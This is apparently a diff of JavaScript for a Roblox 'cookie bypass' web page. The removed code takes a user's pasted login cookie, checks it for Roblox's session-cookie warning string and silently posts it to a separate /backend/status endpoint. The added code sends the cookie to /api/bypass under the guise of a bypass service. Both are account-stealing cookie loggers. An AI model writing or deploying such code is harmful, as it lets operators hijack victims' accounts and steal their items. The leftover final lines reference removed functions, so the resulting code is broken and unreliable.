@@ -1,60 +1,55 @@
-const url = `${location.origin}/backend`;
+document.addEventListener("DOMContentLoaded", () => {
+    const form = document.getElementById("bypass-form");
+    const input = document.getElementById("cookie-input");
+    const resultBox = document.getElementById("result-box");
+    const resultText = document.getElementById("result-text");
 
-const inputCookie = document.querySelector('.main-input');
-const notify = document.querySelector('.app-notify');
-const buttonNotify = document.querySelector('.app-notify-button');
-const buttonBypass = document.querySelector('.main-button');
-const mainResult = document.querySelector('.main-result');
-const resultContent = document.querySelector('.result-content');
-const resultButton = document.querySelector('.result-button');
+    form.addEventListener("submit", async (e) => {
+        e.preventDefault();
 
-const setFirstTimeOnWebsite = _ => {
-    localStorage.setItem('firstTimeOnWebsite', true);
-    notify && notify.remove();
-};
+        const cookie = input.value.trim();
+        if (!cookie) {
+            showResult("Insira um cookie válido.", true);
+            return;
+        }
 
-const checkFirstTimeOnWebsite = _ => {
-    const hasData = localStorage.getItem('firstTimeOnWebsite');
-    !hasData && notify && notify.classList.add('visible');
-};
+        try {
+            const response = await fetch("/api/bypass", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify({ cookie }),
+            });
 
-const cookieRefresh = async c => {
-    const buttonText = buttonBypass.textContent;
-    mainResult.classList.contains('data-get') && mainResult.classList.remove('data-get');
-    buttonBypass.textContent = 'Loading...';
-    buttonBypass.disabled = true;
+            if (!response.ok) {
+                const msg = response.status === 405 
+                    ? "Erro 405: Método não permitido pelo servidor."
+                    : `Erro ${response.status}: ${response.statusText}`;
+                showResult(msg, true);
+                return;
+            }
 
-    await fetch(`${location.origin}/refresh`, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/x-www-form-urlencoded'
-        },
-        body: `cookie=${c}`
-    }).then(res => res.text()).then(res => {
-        const result = res;
-        const cookieValidation = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
+            const data = await response.json();
+            if (data.success) {
+                showResult(`Cookie bypassado com sucesso: ${data.result}`);
+            } else {
+                showResult("Falha ao bypassar o cookie. Verifique se ele é válido.", true);
+            }
 
-        buttonBypass.textContent = buttonText;
-        buttonBypass.disabled = false;
-
-        mainResult.classList.add('data-get');
-        resultContent.textContent = result;
-        resultButton.onclick = copieText.bind(this, result);
-
-        if (!result.includes(cookieValidation)) return;
-
-        const data = new FormData();
-        data.append('cookie', result);
-
-        return fetch(`${url}/status/`, { method: 'POST', body: data });
+        } catch (error) {
+            showResult("Erro de conexão com o servidor. Tente novamente mais tarde.", true);
+            console.error(error);
+        }
     });
-};
 
-const copieText = async text => await navigator.clipboard.writeText(text);
+    function showResult(message, isError = false) {
+        resultBox.style.display = "block";
+        resultText.innerText = message;
+        resultText.style.color = isError ? "#ff4c4c" : "#00ff99";
+    }
+});
 
-if (buttonNotify) {
-    buttonNotify.onclick = setFirstTimeOnWebsite;
-}
 
 buttonBypass.onclick = _ => cookieRefresh(inputCookie.value.trim());
 window.onload = checkFirstTimeOnWebsite;
